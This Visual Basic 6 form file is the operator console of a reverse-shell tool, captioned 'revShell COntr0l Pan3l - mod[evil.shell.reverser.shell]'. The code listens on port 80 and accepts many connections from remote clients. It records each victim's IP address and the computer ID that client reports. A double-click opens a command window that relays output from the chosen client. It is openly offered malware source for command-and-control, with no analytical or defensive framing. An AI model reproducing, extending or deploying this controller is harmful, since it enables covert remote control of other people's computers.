VERSION 5.00
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "COMCTL32.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMainServer 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "revShell COntr0l Pan3l - mod[evil.shell.reverser.shell]"
   ClientHeight    =   4815
   ClientLeft      =   7425
   ClientTop       =   3240
   ClientWidth     =   6570
   ForeColor       =   &H8000000A&
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4815
   ScaleWidth      =   6570
   Begin MSWinsockLib.Winsock sockServer 
      Index           =   0
      Left            =   5760
      Top             =   360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin ComctlLib.ListView lstConn 
      Height          =   4815
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   6615
      _ExtentX        =   11668
      _ExtentY        =   8493
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   327682
      ForeColor       =   16777215
      BackColor       =   0
      BorderStyle     =   1
      Appearance      =   1
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   0
   End
End
Attribute VB_Name = "frmMainServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SendMessageA Lib "user32" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Dim columnHeaders As ColumnHeader 'For ListView Column Headers
Dim listItems As ListItem 'For ListView ListItems

Private Sub Form_Load()
'AlwaysOnTop frmMainServer.hwnd, frmMainServer.Width, frmMainServer.Height 'Always On Top
Set columheaders = lstConn.columnHeaders.Add(, , "Remote IP", TextWidth("xxx.xxx.xxx.xxx"))
Set columheaders = lstConn.columnHeaders.Add(, , "Remote IP", TextWidth("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"))
SendMessageA lstConn.hwnd, &H1000 + 54, &H1, ByVal 1 'Grids
SendMessageA lstConn.hwnd, &H1000 + 54, &H20, ByVal True 'Grids
sockServer(0).Close 'Clear the Socket
sockServer(0).LocalPort = 80 'Listen on Local Port
sockServer(0).Listen 'Start Listening
End Sub

'On Form Resize, the ListView should also be reSized
Private Sub Form_Resize()
lstConn.Height = frmMainServer.Height
lstConn.Width = frmMainServer.Width
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub
'On Double Clicking on a client Open the CMD window
Private Sub lstConn_DblClick()
frmMainServer.Hide
frmCmdWindow.Show
End Sub

'Private Sub sockServer_Close(Index As Integer)
'Dim intSck As Integer
'For intSck = 1 To lstConn.listItems.Count
'If lstConn.listItems(intSck).Index = Index Then
'lstConn.listItems.Remove (Index)
'Exit Sub
'End If
'Next intSck
'End Sub

'On Accept Connection from remote Client
Private Sub sockServer_ConnectionRequest(Index As Integer, ByVal requestID As Long)
Dim numSocket As Integer
Dim numElem As Integer
Dim i As Integer
numElem = sockServer.UBound 'Total Number of Sockets
For i = 1 To numElem
If sockServer(i).State <> 7 Then 'If !Connected(7)
numSocket = i
sockServer(numSocket).Close 'Clear the !Connected Socket
sockServer(numSocket).Accept requestID 'Accept Conn on the ReQuest ID
GoTo listChange
End If
Next i
Load sockServer(numElem + 1) 'Load a new Socket => MultiClient ;)
numSocket = sockServer.UBound
sockServer(numSocket).Close
sockServer(numSocket).Accept requestID
listChange:
Set listItems = lstConn.listItems.Add(, , sockServer(numSocket).RemoteHostIP) 'Add the IP of Remote HOST to the Conn List
End Sub

Private Sub sockServer_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim recvData As String
Dim idCard As String
sockServer(Index).GetData recvData, vbString 'Recv the Sent Data
If Left$(recvData, Len("<compID>")) = "<compID>" Then 'Enumerate Wether Sent Data Contains SySID
idCard = Right(recvData, Len(recvData) - Len("<compID>"))
lstConn.listItems(Index).SubItems(1) = idCard
End If
If lstConn.SelectedItem.Index = Index Then
frmCmdWindow.txtDisplay.Text = frmCmdWindow.txtDisplay.Text + recvData + vbCrLf
End If
End Sub
